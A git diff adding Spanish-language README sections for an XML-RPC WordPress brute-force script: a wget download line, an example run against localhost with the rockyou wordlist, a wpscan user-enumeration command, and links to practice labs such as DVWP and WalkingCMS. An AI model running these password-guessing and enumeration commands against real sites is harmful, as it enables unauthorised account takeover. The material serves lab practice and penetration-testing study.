@@ -13,5 +13,29 @@ Las opciones son las siguientes:
 ## Descargar
 
 ```shell
-wget
+wget https://raw.githubusercontent.com/TerrorAterrador/BruteForce-XmlRpc/main/brute-force-xmlrpc.sh
 ```
+
+## Ejemplo Práctico
+
+```shell
+./brute-force-xmlrpc.sh -d http://127.0.0.1:31337 -w /usr/share/wordlists/rockyou.txt -u TerrorAterrador -i
+```
+
+![image](https://github.com/user-attachments/assets/0a854469-11c9-407a-8fdd-28cb2d7861ed)
+
+## WpScan
+
+Para sacar los posibles nombres de usuarios podríamos usar la herramienta **WpScan**:
+
+```shell
+wpscan --url http://127.0.0.1:31337 -e u
+```
+
+![image](https://github.com/user-attachments/assets/4dec1901-cf21-4b89-a566-4cd2dfba06aa)
+
+#### Ayuda
+
+En el caso de que queramos probar el script de fuerza bruta podríamos usar el recurso [DVWP](https://github.com/vavkamil/dvwp) el cual nos monta unos contenedores con un WordPress para realizar pruebas.
+
+También podríamos usar el laboratorio **WalkingCMS** de [DockerLabs](https://dockerlabs.es) creado por el [El Pinguino De Mario](https://github.com/Maalfer)
